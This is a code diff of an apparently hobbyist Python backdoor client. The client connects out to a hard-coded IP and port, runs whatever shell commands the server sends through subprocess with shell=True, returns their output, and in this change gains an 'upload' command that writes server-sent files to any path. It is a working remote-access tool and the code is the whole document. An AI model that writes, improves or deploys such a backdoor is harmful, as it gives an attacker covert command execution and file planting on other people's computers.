@@ -2,11 +2,12 @@
 import socket
 import subprocess
 import os
+import shlex
 
 ADDR = '23.123.182.6'#my public facing IPv4. If you are looking to test this dr. use loopback.
 PORT = 7771 #only open when im running server
 CWD = os.getcwd()
-BYTEBUFFER = 1024
+BYTEBUFFER = 4096
 SPLITTER = b"<<<Split>>>"
 
 class Client:
@@ -22,23 +23,34 @@ class Client:
             while True:
                 try:
                     servCom = soc.recv(BYTEBUFFER)
-                    servComArr = servCom.split(b" ")
-                    print("Received command: " + str(servCom))
+                    #print(len(servCom))
+                    servCom = servCom.decode()
+                    servComArr = shlex.split(servCom)
+                    print("Received command: " + str(servCom) + f"\n{servComArr}")
                     #custom command checking
-                    if servCom == b'killDoor':
+                    if servCom == 'killDoor':
                         soc.sendall(b'EXCEPTION')#simulate an exception to close server side
                         break
-                    elif servComArr[0] == b'printClient':
+                    elif servComArr[0] == 'printClient':
                         print(servComArr[1:])
                         soc.sendall(b"Text was printed!")#respond to server
                     #server is initiating transfer
-                    elif f'transfer{SPLITTER}'.encode() in servCom:
+                    elif servComArr[0] == "upload":
+                        fileLocation = servComArr[1]
+                        fileSizeBytes = int(servComArr[2])
+                        fileChunks = int(servComArr[3])
+                        with open(fileLocation, 'wb') as outFile:
+                            for x in range(fileChunks+1):#all but last offsized chunk
+                                outFile.write(soc.recv(BYTEBUFFER))
+                            #remainingBytes = fileSizeBytes-(BYTEBUFFER*(fileChunks-1))
+                            #outFile.write(soc.recv(remainingBytes))
+                            outFile.close()
+                        soc.sendall(b'\nfile was successfully uploaded to remote.')
+                    elif servComArr[0] == 'grab':
                         print()
-                    elif servComArr[0] == b'grab':
-                        print()
-                    elif servComArr[0] == b'cd':
+                    elif servComArr[0] == 'cd':
                         try:
-                            os.chdir(servComArr[1].decode("utf-8"))
+                            os.chdir(servComArr[1])
                             out = "new DIR: " + os.getcwd()
                             soc.sendall(out.encode('utf-8'))
                         except FileNotFoundError as e:
@@ -47,14 +59,17 @@ class Client:
                             soc.sendall(os.getcwd().encode('utf-8'))
                     # all other commands will be default shell commands, return output.
                     else:
-                        process = subprocess.Popen(servCom.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        process = subprocess.Popen(servCom, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         output = process.stdout.read()+process.stderr.read()
                         print(output)
-                        if output == b"":
+                        if output == b"" or output == "":
                             soc.sendall(b'command executed on remote. no output was given.')
                         else:
                             soc.sendall(output)
                 #gracefully close connection on exception
+                except UnicodeDecodeError as e:
+                    print(e)
+                    continue
                 except Exception as e:
                     soc.sendall(b"EXCEPTION")
                     print(e.with_traceback())
